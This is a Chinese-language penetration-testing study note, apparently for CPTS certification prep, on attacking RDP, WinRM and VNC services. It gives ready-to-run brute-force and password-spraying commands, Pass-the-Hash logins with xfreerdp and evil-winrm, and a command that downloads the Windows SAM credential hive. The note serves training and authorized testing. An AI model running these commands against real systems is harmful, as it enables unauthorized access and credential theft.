# 第 51 章 - RDP、WinRM 與 VNC

## 標籤

- #cpts
- #chapter
- #rdp
- #winrm
- #vnc
- #remote-access

## 學習目標

- 理解遠端管理協定的暴露風險與對應的測試方法。
- 能用 nmap、crowbar、hydra 對 RDP/WinRM/VNC 進行憑證測試。
- 能用 evil-winrm 取得 WinRM shell。
- 能區分弱認證、未加密、Pass-the-Hash 等不同利用路徑。

---

## 理論基礎

```text
RDP（Remote Desktop Protocol）：
  Port: 3389/tcp
  Windows 遠端桌面，提供 GUI 存取
  風險：弱密碼、BlueKeep（CVE-2019-0708）、Pass-the-Hash（RDP restricted admin）

WinRM（Windows Remote Management）：
  Port: 5985/tcp（HTTP）、5986/tcp（HTTPS）
  PowerShell 遠端管理（Enter-PSSession）
  風險：弱密碼、Pass-the-Hash、Kerberos 票據

VNC（Virtual Network Computing）：
  Port: 5900/tcp（主要）、5901+ （多使用者）
  平台無關的圖形遠端存取
  風險：弱/無密碼、VNC 密碼最長 8 字元、無加密版本
```

---

## 方法一：服務發現

```bash
# 掃描遠端管理服務
nmap -sV -p 3389,5985,5986,5900-5910 TARGET_IP
# 5900-5910 → VNC 可能在多個 port 運行

# RDP NSE 腳本
nmap --script rdp-enum-encryption -p 3389 TARGET_IP
# rdp-enum-encryption → 列出 RDP 支援的加密層與安全協定
# 若顯示 "Classic RDP Security" → 未加密，可能被 MITM

# VNC NSE 腳本
nmap --script vnc-info,vnc-brute -p 5900 TARGET_IP
# vnc-info  → 版本與安全類型（None=無需密碼，VNC=密碼，NLA=更強認證）

# WinRM 確認
curl -s http://TARGET_IP:5985/wsman
# 若回傳 XML → WinRM 啟用
```

---

## 方法二：RDP 憑證測試

```bash
# crowbar（支援 RDP 且處理限制較好）
crowbar -b rdp -s TARGET_IP/32 -u administrator -C /usr/share/wordlists/rockyou.txt
# -b rdp → 目標服務
# -s → 目標（需加 /32 表示單一主機）
# -u → 使用者名稱
# -C → 密碼字典

# hydra RDP（較快但較不穩定）
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  rdp://TARGET_IP
# 注意：RDP 暴力破解可能觸發帳號鎖定，先確認鎖定原則

# 密碼噴灑（避免鎖定，同一密碼試多個帳號）
crackmapexec rdp TARGET_IP -u users.txt -p 'Password123' --continue-on-success

# 連線 RDP（成功後）
xfreerdp /u:administrator /p:password /v:TARGET_IP
# /u → 使用者名稱
# /p → 密碼
# /v → 目標 IP

xfreerdp /u:administrator /p:password /v:TARGET_IP /cert-ignore
# /cert-ignore → 忽略憑證錯誤（自簽憑證）

# Pass-the-Hash（需 Restricted Admin mode 啟用）
xfreerdp /u:administrator /pth:NTLM_HASH /v:TARGET_IP /cert-ignore
# /pth → 傳入 NTLM hash 而非明文密碼
```

---

## 方法三：WinRM 枚舉與利用

```bash
# 確認 WinRM 可達
crackmapexec winrm TARGET_IP -u administrator -p password
# 若顯示 (Pwn3d!) → 有 WinRM 存取權且是管理員

# evil-winrm 取得 shell（最常用）
evil-winrm -i TARGET_IP -u administrator -p password
# -i → 目標 IP
# -u → 使用者名稱
# -p → 密碼

# Pass-the-Hash 登入 WinRM
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
# -H → NTLM hash

# 使用 Kerberos 票據
evil-winrm -i TARGET_IP -u administrator -p password -r DOMAIN.COM
# -r → realm（Kerberos）

# 上傳/下載檔案（evil-winrm shell 內）
*Evil-WinRM* PS> upload /local/path/file.exe C:\Windows\Temp\
*Evil-WinRM* PS> download C:\Windows\System32\config\SAM /tmp/SAM
```

---

## 方法四：VNC 憑證測試

```bash
# 掃描 VNC 安全類型
nmap --script vnc-info -p 5900 TARGET_IP
# 若 Security type: None → 無需密碼，直接連線

# hydra VNC 暴力破解
hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET_IP
# VNC 密碼最長 8 字元（舊式 DES 加密）

# 連線 VNC（無密碼）
vncviewer TARGET_IP:5900
# 或
xvncviewer TARGET_IP

# 連線 VNC（有密碼）
vncviewer TARGET_IP:5900
# 輸入密碼

# 若只有命令列，用 xtightvncviewer
xtightvncviewer TARGET_IP
```

---

## 決策流程

```
nmap -p 3389,5985,5900 確認服務
    ↓
RDP？→ crowbar/hydra → xfreerdp 連線
WinRM？→ crackmapexec → evil-winrm shell
VNC？→ vnc-info（None？直接連）→ hydra → vncviewer
    ↓
有 NTLM hash？
  → RDP：xfreerdp /pth
  → WinRM：evil-winrm -H
    ↓
取得存取 → 進一步枚舉/提權
```

---

## 速查表

```bash
# RDP 暴力破解
crowbar -b rdp -s TARGET_IP/32 -u admin -C rockyou.txt
# RDP 連線
xfreerdp /u:admin /p:pass /v:TARGET_IP /cert-ignore

# WinRM shell
evil-winrm -i TARGET_IP -u admin -p pass
evil-winrm -i TARGET_IP -u admin -H NTLM_HASH

# VNC 掃描
nmap --script vnc-info -p 5900 TARGET_IP
# VNC 暴力破解
hydra -P rockyou.txt vnc://TARGET_IP
# VNC 連線
vncviewer TARGET_IP:5900
```

---

## 關聯筆記

- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
